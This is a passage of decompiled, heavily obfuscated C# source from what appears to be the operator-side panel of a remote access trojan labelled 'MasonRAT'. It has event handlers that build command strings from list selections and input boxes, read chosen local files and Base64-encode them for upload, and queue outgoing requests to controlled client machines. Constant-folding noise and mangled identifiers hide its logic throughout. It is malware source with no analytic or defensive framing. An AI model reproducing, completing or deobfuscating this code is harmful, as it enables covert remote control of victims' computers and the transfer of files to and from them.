            string Left = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 274), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 275), selectedItem.Text, ((-14037763 ^ (1568587040 | 1792904269)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) - ~((1899825603 << 1038345908) - 486961554 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (~959496212 - 1203283948 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ -1240322891 - 962727816 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 << ~1929382494 - 300322358 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0));
            if (Operators.CompareString(Left, selectedItem.Text, false) != 0)
            {
              string[] strArray = new string[(1376814071 - 1202657327 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + ~((174156710 ^ 1704797825 >> 57543546) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0];
              strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 276);
              strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[(529896009 - 1904577095 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - (-1358200870 - (1277541825 | 871670936) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 << ((1465435659 ^ 1597293967 << 1019573612) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 277);
              strArray[(-1915160087 - (404350499 << 1982133072) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ^ ~(195899240 + 1285346989 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[((45252701 > 793726093 ? 429426613 : 322069960) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) - ((1960322704 > 619278356 ? 322069956 : 429426608) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
              strArray[(1570294193 + 1676539671 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 ^ -((2003021624 > 1981822741 ? 1048133427 : 1397511236) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = selectedItem.Text;
              strArray[-341267981 - -600378377 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + (1829387478 + 1450818551 % 420759192 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 << -1704260211 - 1325987436 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[(0 + (82919029 >> 128533942) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ^ (1746630028 << 139115942) - 115172076 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0] = Left;
              Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
              Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
            }
          }
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cد\u060A\u060Aـڣـڙڙڦ\u060F\u060Bگ\u0609ـ\u060Dٻ\u060Cﻋڙـ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
  }

  private void \u2694️MasonRAT\u270Cئ\u060Aـ\u060Fبـ̍\u0609ٽ\u060Aﻻټـ\u0608ٺ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڼټـ̍\u060Bـــڕ̨څ\u060E\u0609(object sender, KeyEventArgs e)
  {
    if (e.KeyCode != (Keys) ((1 ^ (15 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)))
      return;
    e.SuppressKeyPress = true;
    this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
  }

  private void \u2694️MasonRAT\u270Cּٽڝڅ\u0609\u060Bدـا\u060Dڦٻ\u0609ڙٻى\u060Aم(
    object sender,
    EventArgs e)
  {
    OpenFileDialog openFileDialog1 = new OpenFileDialog();
    openFileDialog1.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 278);
    openFileDialog1.Multiselect = true;
    OpenFileDialog openFileDialog2 = openFileDialog1;
    if (openFileDialog2.ShowDialog() != DialogResult.OK)
      return;
    string[] fileNames = openFileDialog2.FileNames;
    int num = checked (fileNames.Length - 1);
    int index = 0;
    while (index <= num)
    {
      string[] strArray = new string[(541764490 - 1100190000 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + ((467611619 > 1913656229 ? 744567354 : 558425516) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) % (1810587393 - (1448574103 >> 729959852) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 279);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((1918133634 > 2046336293 ? -257250642 : -192937982) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ 410401405 + 1215739083 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 << (1721088608 + 1979243481 % 278802483 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
      strArray[(377178445 + ~377178426 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 ^ (30 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = Path.GetFileName(fileNames[index]);
      strArray[(20051078 - 2021646913 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + ((1980360102 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 | (665265415 > 911501003 ? 1504831385 : 1128623539) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(-271372444 - -337624045 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) - (112442375 + 1304102699 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) % ((1758142523 > 2106709040 ? 1800391304 : 1350293478) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = Convert.ToBase64String(File.ReadAllBytes(fileNames[index]));
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      checked { ++index; }
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aۧ̍ڙءـــٽ̍(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        string[] strArray = new string[(323360350 + -903148614 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + ((1905905999 ^ 1394019489 % 2076624651) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 280);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(-402873769 - (485637801 << 1335005002) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 > 555979369 - -651280964 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ? (1947958722 ^ 1104178679 << 240429414) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 : 57418692 - 503096650 % 222838980 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[((44925631 > 250019025 ? -1400616012 : -1050462009) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ ~((1050462008 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = selectedItem.Text;
        strArray[((237328860 > 1672210061 ? -1816736012 : -1362552009) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ -(-468753605 - ~1831305617 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[((276648258 ^ -1848305688) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 ^ ~(1827656224 + (292022064 << 419937632) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = selectedItem.Text;
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Bـ\u060Aۧـــحدٺﻻـ\u060Cۙڠ\u060Aٽط(
    object sender,
    EventArgs e)
  {
    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 281), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 282), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 283), ((159372631 ^ -159372480) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + ((91294150 ^ (2136392908 | 1987817786)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 >> (1362034371 - (1835221171 >> 335523800) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), (381886418 - 67566488 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) - (197006395 + (931192770 << 1220569611) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1));
